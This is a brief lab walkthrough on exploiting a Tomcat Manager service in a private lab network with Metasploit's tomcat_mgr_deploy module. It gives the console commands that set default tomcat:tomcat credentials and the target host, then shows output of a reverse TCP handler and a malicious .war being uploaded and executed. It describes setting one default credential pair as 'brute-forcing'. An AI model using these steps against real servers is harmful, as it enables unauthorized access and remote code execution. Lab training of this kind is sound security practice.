# Lab: Exploiting Tomcat Manager with Metasploit

## Objective

The objective of this lab is to **exploit** the Tomcat Manager application on a target system running on port `8180`, using Metasploit. The goal is to demonstrate how to deploy malicious `.war` files and perform **credential brute-forcing** to gain unauthorized access to the service.

## Target Information

- **Target IP**: `192.168.56.101`
- **Port**: `8180` (Tomcat Manager)

---

## Lab Setup

In this lab, we exploit a vulnerable Tomcat Manager instance by performing the following steps:

### 1. **Exploitation Using Metasploit**

We use the `multi/http/tomcat_mgr_deploy` exploit to deploy a `.war` file to the Tomcat Manager service.

#### Step-by-Step Exploit Commands

First, configure Metasploit to target the Tomcat service on the target IP and port:

So, start with **brute-forcing** the credentials
using metasploit 

```bash
msf exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set rhosts 192.168.56.101
msf exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
msf exploit(multi/http/tomcat_mgr_deploy) > run
```

This will:

Set the username and password for authentication (tomcat:tomcat).

Set the target IP (192.168.56.101) and port (8180).

Deploy a malicious .war file to the Tomcat Manager.

Example Output from the Exploit
[*] Started reverse TCP handler on 10.10.10.10:4444
[*] Attempting to automatically select a target ...
[*] Automatically selected target "Linux x86"
[*] Uploading 6222 bytes as oHDJLRit3sn20UnGUILjhnR0J.war ...
[*] Executing /oHDJLRit3sn20UnGUILjhnR0J/TIROJxrZHnfqjT3Q4Y8o.jsp ...
[*] Undeploying oHDJLRit3sn20UnGUILjhnR0J ...


The exploit successfully uploaded and executed the .war file.
